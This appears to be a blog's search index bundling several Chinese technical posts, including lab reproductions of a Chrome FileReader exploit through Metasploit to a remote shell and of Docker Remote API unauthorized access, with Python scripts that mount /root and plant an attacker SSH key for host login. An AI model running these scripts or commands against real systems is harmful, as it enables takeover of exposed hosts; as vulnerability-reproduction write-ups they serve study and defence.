<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Android9.0开启对Http的访问(对于API 28的新特性解决)</title>
    <url>/posts/7e8769d2.html</url>
    <content><![CDATA[<h3 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h3><p>当build.gradle中compileSdkVersion 28,targetSdkVersion 28时，安卓9.0的设备访问http的网址发生异常</p>
<span id="more"></span>

<p><img src="/posts/7e8769d2/360%E6%88%AA%E5%9B%BE-5344812.png" alt="360截图-5344812.png"></p>
<h3 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h3><h4 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h4><p>创建安全配置文件<br>1.在res文件夹下面创建xml目录，xml下创建network-security-config文件<br>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">network-security-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base-config</span> <span class="attr">cleartextTrafficPermitted</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">base-config</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">network-security-config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h4><p>2.在AndroidManifest中的Application申明一下<br><img src="/posts/7e8769d2/360%E6%88%AA%E5%9B%BE-5784765.png" alt="360截图-5784765.png"></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Develop</tag>
      </tags>
  </entry>
  <entry>
    <title>BuildRoot交叉编译ARM平台GCC</title>
    <url>/posts/9ee44d86.html</url>
    <content><![CDATA[<p>使用buildroot可以在Linux系统上编译出其他平台的GCC，而GCC编译出的可执行文件能够在对应平台上执行。</p>
<span id="more"></span>

<p>本文是在ubuntu18.04成功的，按道理其他版本应该没问题</p>
<h2 id="目标平台"><a href="#目标平台" class="headerlink" title="目标平台"></a>目标平台</h2><p>Netgear R7000v1&#x2F;R8000</p>
<h3 id="查看平台信息"><a href="#查看平台信息" class="headerlink" title="查看平台信息"></a>查看平台信息</h3><p>cat &#x2F;proc&#x2F;cpuinfo</p>
<p>也可以file或者readelf查看路由器固件解包出的可执行文件，例如wget，busybox</p>
<p>uname -a</p>
<p><img src="/posts/9ee44d86/Untitled.png" alt="Untitled"></p>
<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>sudo apt-get install vim make gcc build-essential bison flex libncurses5-dev</p>
<h2 id="装buildroot"><a href="#装buildroot" class="headerlink" title="装buildroot"></a>装buildroot</h2><p>wget <a href="https://buildroot.org/downloads/buildroot-2021.02.tar.gz">https://buildroot.org/downloads/buildroot-2021.02.tar.gz</a></p>
<p>tar -zxf buildroot-2021.02.tar.gz</p>
<h2 id="设置编译选项"><a href="#设置编译选项" class="headerlink" title="设置编译选项"></a>设置编译选项</h2><p>注：配置编译选项 窗口不要太小，不然会报错</p>
<p>注：每次修改完要先save再exit</p>
<p>cd buildroot-2021.02</p>
<p>sudo make menuconfig</p>
<p><img src="/posts/9ee44d86/1.png" alt="1"></p>
<p>Target options选择</p>
<p><img src="/posts/9ee44d86/2.png" alt="2"></p>
<p>toolchain选择</p>
<p><img src="/posts/9ee44d86/3.png" alt="3"></p>
<h2 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h2><p>make</p>
<p>最后得到</p>
<p><img src="/posts/9ee44d86/4.png" alt="4"></p>
<h2 id="GCC编译"><a href="#GCC编译" class="headerlink" title="GCC编译"></a>GCC编译</h2><p>.&#x2F;arm-buildroot-linux-uclibcgnueabi-gcc &#x2F;home&#x2F;test&#x2F;Desktop&#x2F;ttt.c -static -o &#x2F;home&#x2F;test&#x2F;Desktop&#x2F;ttt</p>
<p>-static 静态编译</p>
<p><img src="/posts/9ee44d86/5.png" alt="5"></p>
<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>问：出现问题如何重新编译？</p>
<p>答：make clean</p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>BuildRoot</tag>
        <tag>交叉编译</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-5786（chrome_filereader_uaf）漏洞复现</title>
    <url>/posts/d764ea3d.html</url>
    <content><![CDATA[<h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>由FileReader上的UAF漏洞可造成Chrome的远程代码执行。</p>
<p>针对Windows7x86系统，Chrome版本72.0.3626.119。</p>
<p>实际利用时，要配合其他漏洞如CVE-2019-0808来绕过Chrome沙箱才可以利用成功。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>受害者：win7x86虚拟机 + Chrome浏览器</p>
<ul>
<li><p>镜像使用<a href="ed2k://|file|cn_windows_7_professional_x86_dvd_x15-65790.iso|2604238848|E812FBE758F05B485C5A858C22060785|/">cn_windows_7_professional_x86_dvd_x15-65790.iso</a></p>
</li>
<li><p>Chrome版本使用<a href="http://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe%EF%BC%89">72.0.3626.119_chrome_installer.exe</a></p>
</li>
</ul>
<p>攻击者：MacOS + Metaspolit</p>
<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>进入Chrome安装位置，执行命令  以关闭沙箱的方式启动</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">chrome.exe --no-sandbox</span><br></pre></td></tr></table></figure>

<p><img src="/posts/d764ea3d/image-20200630213752635.png" alt="image-20200630213752635"></p>
<p>启动msf，加载模块，设置参数，执行攻击，拿到shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动msf</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="comment"># 搜索并选择</span></span><br><span class="line">search CVE-2019-5786</span><br><span class="line">use 0</span><br><span class="line"><span class="comment"># 查看要设置哪些参数</span></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 只用设置攻击者监听IP就可以</span></span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.0.5</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">run</span><br><span class="line"><span class="comment"># Chrome访问生成的URL</span></span><br><span class="line"><span class="comment"># http://192.168.0.5:8080/9rBZXKhXHX3og3</span></span><br><span class="line"><span class="comment"># 等几秒可以获取到session</span></span><br><span class="line">session -i 1</span><br><span class="line"><span class="comment"># 选择该session获取meterpreter会话，sysinfo查看系统信息</span></span><br><span class="line">sysinfo</span><br><span class="line"><span class="comment"># 也可以直接获取目标机CMD</span></span><br><span class="line">shell</span><br><span class="line"><span class="comment"># 更改目标机编码为utf-8，解决显示乱码</span></span><br><span class="line">chcp 65001</span><br><span class="line"><span class="comment"># 弹出计算器</span></span><br><span class="line">calc</span><br></pre></td></tr></table></figure>

<p><img src="/posts/d764ea3d/image-20200701110357248.png" alt="image-20200701110357248"></p>
<p><img src="/posts/d764ea3d/image-20200701110512878.png" alt="image-20200701110512878"></p>
<p><img src="/posts/d764ea3d/image-20200701110201446.png" alt="image-20200701110201446"></p>
<p><img src="/posts/d764ea3d/image-20200701110717635.png" alt="image-20200701110717635"></p>
<p><img src="/posts/d764ea3d/image-20200701111415202.png" alt="image-20200701111415202"></p>
<p><img src="/posts/d764ea3d/image-20200701111522119.png" alt="image-20200701111522119"></p>
<p><img src="/posts/d764ea3d/image-20200701111552624.png" alt="image-20200701111552624"></p>
<p><img src="/posts/d764ea3d/image-20200630214610496.png" alt="image-20200630214610496"></p>
<h3 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h3><ul>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650944995&idx=1&sn=8dbc7e1353c77066a1318fb8dfc1f041&chksm=807977d1b70efec7023644bd9537aff02dca7ecce20e738ca2d98908d556d62ccd9538447093&mpshare=1&scene=1&srcid=0629ZY1R01MNnxvnQx4hxRbn&sharer_sharetime=1593418086197&sharer_shareid=08acff567b3294158bc829ca4ef3cb63#rd">CVE-2019-5786 漏洞原理分析及利用</a></p>
</li>
<li><p><a href="https://weibo.com/ttarticle/p/show?id=2309404351596157885398">CVE-2019-5786 Chrome远程代码执行漏洞分析</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker Remote API 未授权访问漏洞复现</title>
    <url>/posts/4956b0d5.html</url>
    <content><![CDATA[<p>网上的文章有很多，只是复现时有些细节不清晰，本文尽可能详尽叙述</p>
<span id="more"></span>

<p>注：利用脚本没有采用docker库，直接使用的http请求</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="安装Docker环境"><a href="#安装Docker环境" class="headerlink" title="安装Docker环境"></a>安装Docker环境</h3><p>Docker安装按照<a href="https://docs.docker.com/engine/install/">官方文档</a>安装就好</p>
<h4 id="当前环境："><a href="#当前环境：" class="headerlink" title="当前环境："></a>当前环境：</h4><p>靶机：Ubuntu16.04 + Docker 19.03.13</p>
<p>IP：172.16.180.160</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~# docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           19.03.13</span><br><span class="line"> API version:       1.40</span><br><span class="line"> Go version:        go1.13.15</span><br><span class="line"> Git commit:        4484c46d9d</span><br><span class="line"> Built:             Wed Sep 16 17:02:59 2020</span><br><span class="line"> OS/Arch:           linux/amd64</span><br><span class="line"> Experimental:      false</span><br><span class="line"></span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line"> Engine:</span><br><span class="line">  Version:          19.03.13</span><br><span class="line">  API version:      1.40 (minimum version 1.12)</span><br><span class="line">  Go version:       go1.13.15</span><br><span class="line">  Git commit:       4484c46d9d</span><br><span class="line">  Built:            Wed Sep 16 17:01:30 2020</span><br><span class="line">  OS/Arch:          linux/amd64</span><br><span class="line">  Experimental:     false</span><br><span class="line"> containerd:</span><br><span class="line">  Version:          1.3.7</span><br><span class="line">  GitCommit:        8fba4e9a7d01810a393d5d25a3621dc101981175</span><br><span class="line"> runc:</span><br><span class="line">  Version:          1.0.0-rc10</span><br><span class="line">  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd</span><br><span class="line"> docker-init:</span><br><span class="line">  Version:          0.18.0</span><br><span class="line">  GitCommit:        fec3683</span><br></pre></td></tr></table></figure>

<p>攻击机：黑苹果（10.15.3）&#x2F;可替换为Kali + Python3.7.7</p>
<p>IP：192.168.15.110</p>
<h4 id="配置Docker-Remote-API"><a href="#配置Docker-Remote-API" class="headerlink" title="配置Docker Remote API"></a>配置Docker Remote API</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#备份配置文件</span></span><br><span class="line"><span class="built_in">cp</span> /lib/systemd/system/docker.service /lib/systemd/system/docker.service.bak</span><br><span class="line"></span><br><span class="line"><span class="comment">#编辑文件添加配置ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:8888</span></span><br><span class="line">vim /lib/systemd/system/docker.service</span><br></pre></td></tr></table></figure>

<p>如下图所示（14-15行）：</p>
<p><img src="/posts/4956b0d5/image-20201110105807503.png" alt="image-20201110105807503"></p>
<p>之后执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#加载配置文件</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启docker服务</span></span><br><span class="line">systemctl restart docker.service</span><br></pre></td></tr></table></figure>

<p>若无错误提示，则代表启动成功</p>
<blockquote>
<p>请勿在生产环境中执行上述操作！</p>
</blockquote>
<h3 id="查看运行状态"><a href="#查看运行状态" class="headerlink" title="查看运行状态"></a>查看运行状态</h3><p>浏览器访问：</p>
<p><a href="http://172.16.180.160:8888/v1.25/images/json">http://172.16.180.160:8888/v1.25/images/json</a></p>
<p>可获得镜像列表，如下图所示：</p>
<p><img src="/posts/4956b0d5/image-20201110114628898.png" alt="image-20201110114628898"></p>
<p>其他API：</p>
<p>比如访问以下链接可以获得版本等信息</p>
<p><a href="http://172.16.180.160:8888/v1.25/info">http://172.16.180.160:8888/v1.25/info</a></p>
<p><a href="http://172.16.180.160:8888/version">http://172.16.180.160:8888/version</a></p>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>攻击者会通过发送构造的http请求执行创建容器，启动容器，删除容器等操作</p>
<p>并且可以通过修改 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys或者&#x2F;etc&#x2F;crontab计划任务获得宿主机shell</p>
<h3 id="查看攻击机用户公钥"><a href="#查看攻击机用户公钥" class="headerlink" title="查看攻击机用户公钥"></a>查看攻击机用户公钥</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /Users/iqiqiya/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>

<p><img src="/posts/4956b0d5/image-20201110115908780.png" alt="image-20201110115908780"></p>
<h3 id="创建容器并获得容器ID"><a href="#创建容器并获得容器ID" class="headerlink" title="创建容器并获得容器ID"></a>创建容器并获得容器ID</h3><p>公钥复制到CMD那里，使用镜像alpine:latest（任意一个镜像都可以的）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/11/10</span></span><br><span class="line"><span class="comment"># @FileName  :create_container.py</span></span><br><span class="line"><span class="comment"># 创建容器并获得容器ID</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求体数据</span></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">&quot;Image&quot;</span>: <span class="string">&quot;alpine:latest&quot;</span>,</span><br><span class="line">  <span class="string">&quot;HostConfig&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;Binds&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;/root/:/tmp/:rw&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;CMD&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-c&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mkdir -p /tmp/.ssh &amp;&amp; echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLfkk5aKwJuBHYS30dFNXGr6HYsstu2FNd7AJ83KYQIYkhwBagl6fQqpOwYDs2x1FsZXgyxlMx/p0zTfZFG5UHqJlbFpZH5D21vuH8bULwxyyb9JHquQOuBS0aXuqTf+6us82VG+R4GPqr2yvD5h8dT/t6U3/hMl+GAQu+OmkTHAmequ1BFawJ2E9S83IjwgRMwY1yyyLnn13KU9YPxf9yd+S2IXzizeVaTPNlzsb/c44uHk5GfH3eZFyhYfX11gqHP75RbCNvbJLtzxrgLqtlQcewwMjmOtwv2F6LP6Qdb0csaYLC8eWMsh7NiFwOwk7ls5Fqsh/kCRtRY8/XoGSb iqiqiya@iqiqiyas-MacBook-Pro.local&#x27; &gt;&gt; /tmp/.ssh/authorized_keys&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">## headers中添加上content-type这个参数，指定为json格式</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">## post的时候，将data字典形式的参数用json包转换成json格式</span></span><br><span class="line">response = requests.post(url=<span class="string">&#x27;http://172.16.180.160:8888/v1.25/containers/create&#x27;</span>, headers=headers, data=json.dumps(data2))</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="comment"># &#123;&quot;Id&quot;:&quot;809e116f875232b390515661a7d907f4c02a6eb084512b3bca7cf9131eba264f&quot;,&quot;Warnings&quot;:[]&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="启动该容器"><a href="#启动该容器" class="headerlink" title="启动该容器"></a>启动该容器</h3><p>上面输出的Id就是container_Id</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/11/10</span></span><br><span class="line"><span class="comment"># @FileName  :start_container.py</span></span><br><span class="line"><span class="comment"># 启动容器运行</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求体数据</span></span><br><span class="line">data = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">## headers中添加上content-type这个参数，指定为json格式</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">container_Id = <span class="string">&quot;809e116f875232b390515661a7d907f4c02a6eb084512b3bca7cf9131eba264f&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## post的时候，将data字典形式的参数用json包转换成json格式</span></span><br><span class="line">response = requests.post(url=<span class="string">&#x27;http://172.16.180.160:8888/v1.25/containers/&#x27;</span>+container_Id+<span class="string">&#x27;/start&#x27;</span>, headers=headers, data=json.dumps(data))</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">response2 = requests.get(url=<span class="string">&#x27;http://172.16.180.160:8888/v1.25/containers/&#x27;</span>+container_Id+<span class="string">&#x27;/logs?stderr=True&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(response2.text)</span><br></pre></td></tr></table></figure>

<p>返回是空的，开启成功</p>
<h3 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#攻击机执行</span></span><br><span class="line">ssh 172.16.180.160</span><br><span class="line"></span><br><span class="line">输入<span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">输入密码</span><br><span class="line"></span><br><span class="line">得到ssh会话</span><br><span class="line"></span><br><span class="line">su root</span><br></pre></td></tr></table></figure>

<p><img src="/posts/4956b0d5/image-20201110124806257.png" alt="image-20201110124806257"></p>
<h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/11/10</span></span><br><span class="line"><span class="comment"># @FileName  :exp.py</span></span><br><span class="line"><span class="comment"># Docker Remote API未授权访问漏洞利用</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要修改的参数</span></span><br><span class="line">image_name = <span class="string">&quot;alpine:latest&quot;</span></span><br><span class="line">ip = <span class="string">&quot;172.16.180.160&quot;</span></span><br><span class="line">port = <span class="string">&quot;8888&quot;</span></span><br><span class="line"><span class="comment"># 这个是公钥，也就是id_rsa.pub内容</span></span><br><span class="line">public_key = <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLfkk5aKwJuBHYS30dFNXGr6HYsstu2FNd7AJ83KYQIYkhwBagl6fQqpOwYDs2x1FsZXgyxlMx/p0zTfZFG5UHqJlbFpZH5D21vuH8bULwxyyb9JHquQOuBS0aXuqTf+6us82VG+R4GPqr2yvD5h8dT/t6U3/hMl+GAQu+OmkTHAmequ1BFawJ2E9S83IjwgRMwY1yyyLnn13KU9YPxf9yd+S2IXzizeVaTPNlzsb/c44uHk5GfH3eZFyhYfX11gqHP75RbCNvbJLtzxrgLqtlQcewwMjmOtwv2F6LP6Qdb0csaYLC8eWMsh7NiFwOwk7ls5Fqsh/kCRtRY8/XoGSb iqiqiya@iqiqiyas-MacBook-Pro.local&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># headers中添加上content-type这个参数，指定为json格式</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求体数据</span></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">&quot;Image&quot;</span>: image_name,</span><br><span class="line">  <span class="string">&quot;HostConfig&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;Binds&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;/root/:/tmp/:rw&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;CMD&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-c&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mkdir -p /tmp/.ssh &amp;&amp; echo &quot;</span>+public_key+<span class="string">&quot; &gt;&gt; /tmp/.ssh/authorized_keys&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># post的时候，将data字典形式的参数用json包转换成json格式</span></span><br><span class="line">response = requests.post(url=<span class="string">&#x27;http://&#x27;</span>+ip+<span class="string">&#x27;:&#x27;</span>+port+<span class="string">&#x27;/v1.25/containers/create&#x27;</span>, headers=headers, data=json.dumps(data))</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="comment"># &#123;&quot;Id&quot;:&quot;7603377f77a678e2239c79cfe9d1d4dec5fec3f85554647270263be6c4acecb0&quot;,&quot;Warnings&quot;:[]&#125;</span></span><br><span class="line"></span><br><span class="line">pattern = <span class="string">r&#x27;Id&quot;:&quot;(.*?)&quot;&#x27;</span></span><br><span class="line">container_Id = re.findall(pattern, response.text)[<span class="number">0</span>]</span><br><span class="line">response2 = requests.post(url=<span class="string">&#x27;http://&#x27;</span>+ip+<span class="string">&#x27;:&#x27;</span>+port+<span class="string">&#x27;/v1.25/containers/&#x27;</span>+container_Id+<span class="string">&#x27;/start&#x27;</span>, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response2.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回为空，没有错误信息 代表启动成功</span></span><br><span class="line">response3 = requests.get(url=<span class="string">&#x27;http://&#x27;</span>+ip+<span class="string">&#x27;:&#x27;</span>+port+<span class="string">&#x27;/v1.25/containers/&#x27;</span>+container_Id+<span class="string">&#x27;/logs?stderr=True&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(response3.text)</span><br></pre></td></tr></table></figure>

<h2 id="问题解决记录"><a href="#问题解决记录" class="headerlink" title="问题解决记录"></a>问题解决记录</h2><p>Q1：没有.ssh&#x2F;id_rsa.pub这个文件或路径？</p>
<p>A1：ssh-keygen -c 生成</p>
<p>Q2：ssh无法登陆？</p>
<p>A2：靶机需要开启ssh登录，步骤如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">安装ssh服务</span><br><span class="line">sudo apt-get install openssh-server</span><br><span class="line"></span><br><span class="line">启动</span><br><span class="line">sudo service ssh start</span><br><span class="line"></span><br><span class="line">查询服务启动状态：</span><br><span class="line">sudo ps -e | grep ssh</span><br><span class="line">或者</span><br><span class="line">sudo service ssh status</span><br><span class="line"></span><br><span class="line">配置开机启动：</span><br><span class="line">sudo sysv-rc-conf</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.lightless.me/archives/docker-remote-api-vulnerability.html">Docker Remote API 未授权访问漏洞</a></p>
<p><a href="https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md">Docker daemon api unauthorized access exploit</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker使用小记</title>
    <url>/posts/a304692f.html</url>
    <content><![CDATA[<blockquote>
<p>&amp;emsp;&amp;emsp;Docker是一个开源的应用容器引擎，基于Go语言并遵从 Apache2.0协议开源。Docker可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app），更重要的是容器性能开销极低。—–以上来自runoob</p>
</blockquote>
<span id="more"></span>

<h3 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h3><p>以MAC为例，下载链接：</p>
<p><a href="https://download.docker.com/mac/stable/Docker.dmg">https://download.docker.com/mac/stable/Docker.dmg</a></p>
<p>然后一步步安装即可</p>
<h3 id="阿里云加速"><a href="#阿里云加速" class="headerlink" title="阿里云加速"></a>阿里云加速</h3><p><a href="https://yq.aliyun.com/articles/29941/">https://yq.aliyun.com/articles/29941/</a></p>
<h3 id="镜像相关"><a href="#镜像相关" class="headerlink" title="镜像相关"></a>镜像相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看镜像</span></span><br><span class="line">docker images</span><br><span class="line"><span class="comment"># 导入镜像</span></span><br><span class="line">docker pull 镜像名称</span><br><span class="line"><span class="comment"># 运行镜像（有的命令不太一样 指定端口什么的）</span></span><br><span class="line">docker run -it 镜像名称 /bin/bash</span><br><span class="line"><span class="comment"># 删除镜像 可以指定IMAGE ID</span></span><br><span class="line">docker rmi image_id</span><br></pre></td></tr></table></figure>

<h3 id="容器相关"><a href="#容器相关" class="headerlink" title="容器相关"></a>容器相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看容器运行状态</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="comment"># 运行容器 指定CONTAINER_ID</span></span><br><span class="line">docker start container_id</span><br><span class="line"><span class="comment"># 停止运行</span></span><br><span class="line">docker stop container_id</span><br><span class="line"><span class="comment"># 进入正在运行的容器</span></span><br><span class="line">docker attach container_id</span><br><span class="line">docker <span class="built_in">exec</span> -it container_id /bin/bash</span><br><span class="line"><span class="comment"># 删除容器</span></span><br><span class="line">docker <span class="built_in">rm</span> container_id</span><br><span class="line"><span class="comment"># 导出容器</span></span><br><span class="line">docker <span class="built_in">export</span> container_id &gt; /home/iqiqiya/ubuntu-purge.tar.gz</span><br><span class="line"><span class="comment"># 导入容器</span></span><br><span class="line"><span class="comment"># 文件形式导入</span></span><br><span class="line"><span class="built_in">cat</span> /home/iqiqiya/ubuntu.tar.gz | sudo docker import - ubuntu:14.04</span><br><span class="line"><span class="comment"># 网络导入</span></span><br><span class="line">docker import http://example.com/example.tgz example/imagere:demo</span><br></pre></td></tr></table></figure>

<h3 id="文件拷贝"><a href="#文件拷贝" class="headerlink" title="文件拷贝"></a>文件拷贝</h3><p>本机–&gt;容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> (本地文件路径) (docker container <span class="built_in">id</span>):(容器中路径)</span><br></pre></td></tr></table></figure>

<p>容器–&gt;本机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> (docker container <span class="built_in">id</span>):(容器中路径) (本地文件路径)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>GitHub Pages设置自定义域名ssl启用失败</title>
    <url>/posts/b1adab59.html</url>
    <content><![CDATA[<h3 id="介绍下情况："><a href="#介绍下情况：" class="headerlink" title="介绍下情况："></a>介绍下情况：</h3><p>使用Cloudflare配置DNS，出现<em>Unavailable for your site because your domain is not properly configured to support HTTPS</em>这样的错误提示。</p>
<span id="more"></span>

<p>如下图所示：</p>
<p><img src="/posts/b1adab59/sc_20200608112603.png" alt="sc_20200608112603"></p>
<h3 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h3><p>出现该问题的原因，在默认情况下，Cloudflare会启用HTTP&#x2F;DNS 代理功能，这样的话 GitHub 就无法查看生成 HTTPS 证书所需的 DNS 记录。所以对于指向 GitHub 的任何 DNS 记录，都需要禁用此功能。</p>
